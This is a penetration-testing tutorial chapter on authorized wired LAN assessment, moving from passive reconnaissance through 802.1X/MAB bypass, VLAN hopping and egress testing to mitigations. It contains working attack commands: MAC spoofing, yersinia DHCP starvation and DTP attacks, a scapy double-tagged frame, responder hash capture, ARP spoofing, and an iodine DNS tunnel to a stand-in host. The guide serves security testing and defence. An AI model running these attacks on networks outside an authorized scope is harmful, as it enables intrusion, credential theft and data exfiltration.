---
title: Wired LAN security assessment
summary: "Authorized switch/NAC testing: recon, 802.1X bypass, DHCP, VLAN hopping, MITM, egress"
tags: [pentest, lan, 802.1x, nac, dhcp, vlan hopping, mitm, egress, authorized]
order: 14
---

> **Authorization note:** Physically connecting to a network's Ethernet infrastructure and attempting to bypass NAC, VLAN, or firewall controls is a much more sensitive test than Wi-Fi recon — it demonstrates what an attacker with physical access (an "evil maid", a rogue contractor, someone plugging into an unused conference-room jack) could achieve. Only perform this against your own homelab or under an explicit, signed scope of work.

Wired LAN testing is a different discipline from Wi-Fi. There's no encryption handshake to crack — the questions are about **Layer 2 trust** (does the switch trust whatever plugs into this port?), **Layer 2/3 segmentation** (can you jump VLANs?), and **egress control** (once you have an IP, what does the firewall actually let through?).

---

## Required Resources

- Laptop with a wired NIC (a USB-C/Ethernet adapter works fine), Kali Linux
- `tcpdump` / `Wireshark` — passive capture and protocol analysis
- `macchanger` — MAC address spoofing tests
- `yersinia` — VLAN/STP/DTP/CDP attack framework
- `scapy` — crafting custom 802.1Q double-tagged frames, custom ARP/DHCP packets
- `nmap`, `hping3` — active scanning and egress filtering tests
- `responder` / `bettercap` — LLMNR/NBT-NS poisoning and MITM testing (Windows-heavy environments)
- Optional: a small network TAP or a cheap unmanaged hub, to sit between an existing device (e.g. a VoIP phone) and the switch and see its traffic without triggering port-security violations
- A written test authorization / scope document

---

## Step 1 — Passive Reconnaissance (Before Sending a Single Packet)

Plug in and just listen first. A promiscuous NIC without an IP still sees plenty:

```
sudo tcpdump -i eth0 -nn -e
```

Even with zero configuration you can typically capture:

- **ARP** broadcasts from other hosts — reveals live IPs/MACs on the segment
- **CDP** (Cisco Discovery Protocol) / **LLDP** — often leaks the switch hostname, model, management IP, and native VLAN, straight from the switch itself
- **STP (Spanning Tree)** BPDUs — reveals topology, root bridge, and whether the port is an edge port or could become one
- **DHCP** discover/offer broadcasts from other hosts on the same broadcast domain

```
sudo wireshark -i eth0 -k
```
Filter for `cdp || lldp || stp || arp || dhcp` to triage quickly.

This single step often tells you more about the network's design than an active scan would, and it's completely silent.

---

## Step 2 — Determine Why You Have No DHCP Lease

Common causes, roughly in order of likelihood in a well-run enterprise network:

| Symptom in capture | Likely cause |
|---|---|
| No traffic at all, link light off/blinking oddly | Port administratively shut down (unused port disabled) |
| **EAPOL** frames seen | 802.1X port-based NAC is active |
| ARP/broadcast traffic seen but no DHCP offers reach you | You're in an isolated/guest VLAN with no DHCP scope, or DHCP snooping is dropping your requests |
| Link comes up then drops after a few seconds | Port security violation (unknown MAC triggered err-disable) |

```
sudo tcpdump -i eth0 -nn ether proto 0x888e
```
(`0x888e` is EAPOL — if you see this, you're dealing with real NAC, not a DHCP misconfiguration.)

---

## Step 3 — Testing 802.1X / NAC Bypass

If EAPOL is present, check whether the deployment is full 802.1X (certificate or credential exchange) or the weaker **MAB (MAC Authentication Bypass)**, where the switch simply checks the source MAC against a whitelist (e.g. for printers, VoIP phones, badge readers that can't do 802.1X).

A classic, well-documented test: many networks put an IP phone and a PC on the same physical port via a small switch inside the phone, and the phone is 802.1X/MAB-authenticated while the PC behind it rides on that trust. Sitting a hub/TAP between the phone and the wall jack lets you observe the phone's already-authorized MAC:

```
sudo macchanger -m <phone_MAC> eth0
```

If the port now passes traffic for your spoofed MAC, that confirms **MAC-based trust with no additional binding** (no 802.1X supplicant check on your actual traffic) — a significant finding, since MAC addresses are trivially observable and spoofable.

---

## Step 4 — Manual IP Assignment from Observed Data

If Step 1 revealed a subnet in use (via ARP) but you're not getting a DHCP lease, try manually configuring an address in that range and see what actually gets filtered:

```
sudo ip addr add 192.168.10.50/24 dev eth0
sudo ip route add default via 192.168.10.1
arping -c 3 192.168.10.1
```

This tells you whether the restriction was really "no DHCP" or actually **DHCP snooping / IP source guard**, which will still drop your traffic even with a manually set IP unless it matches a bound DHCP lease.

---

## Step 5 — DHCP Starvation / Forced Response

To check whether DHCP is present but simply not responding to you specifically (e.g. option 82 relay restrictions):

```
sudo nmap --script broadcast-dhcp-discover -e eth0
```

For a more thorough test of whether the DHCP server can be exhausted (a DoS-relevant finding for the report, not something to run against production):

```
sudo yersinia dhcp -attack 1
```

---

## Step 6 — VLAN Hopping

If you land in a segmented/guest VLAN, test whether the port is more permissive than it should be:

**Double-tagging attack** (works only if the port's native VLAN matches your outer tag):
```
sudo scapy
```
```python
pkt = Ether()/Dot1Q(vlan=10)/Dot1Q(vlan=20)/IP(dst="192.168.20.1")/ICMP()
sendp(pkt, iface="eth0")
```

**DTP negotiation** (checking if the switchport will renegotiate into trunk mode):
```
sudo yersinia dtp -attack 1
```

If either succeeds, you've moved from an isolated VLAN to one you shouldn't have access to — a classic, high-impact finding.

---

## Step 7 — On-Segment MITM Testing

Once you do have an IP on a segment, test for weak default protocols that let you intercept other clients' traffic:

```
sudo responder -I eth0 -wrf
```
Tests for LLMNR/NBT-NS poisoning (common in Windows environments — captures NTLM hashes from broadcast name resolution).

```
sudo bettercap -iface eth0
```
For ARP spoofing between a target host and the gateway, to confirm whether the switch/network has any protections like Dynamic ARP Inspection.

---

## Step 8 — Egress Filtering Test (Once You Have a Working IP)

With a working IP, the last question is what the firewall actually allows **outbound**:

```
nmap -sT -Pn --top-ports 100 8.8.8.8
hping3 -S 8.8.8.8 -p 443
hping3 -S 8.8.8.8 -p 53
```

Also worth testing whether DNS is used as an uncontrolled egress channel (same idea as the captive portal DNS tunneling test in Chapter 7):
```
sudo iodine -f -P password 203.0.113.1 tunnel.example.com
```

---

## Step 9 — Documenting Findings

| Finding | Risk |
|---|---|
| Unused ports not administratively disabled | Any physical access = network access |
| MAB / MAC-only trust with no supplementary check | Trivial impersonation of an authorized device (e.g. VoIP phone) |
| CDP/LLDP broadcasting switch hostname & management IP | Reconnaissance aid for an attacker with physical access |
| DTP left in "auto" (dynamic desirable/auto) mode | VLAN hopping into trunk mode |
| No Dynamic ARP Inspection / DHCP snooping | On-segment MITM against other clients |
| Broad outbound egress rules (any port, DNS unrestricted) | Data exfiltration and C2 channels available to any compromised host |

**Recommended mitigations** for the report: disable unused switchports, use full 802.1X with machine/user certificates rather than MAB where possible, disable CDP/LLDP on access ports (or restrict to what's operationally necessary), hard-set trunk/access mode on every port (never leave DTP in auto/desirable), enable DHCP snooping + Dynamic ARP Inspection + IP Source Guard together, and restrict egress to only the ports/destinations a given VLAN legitimately needs.
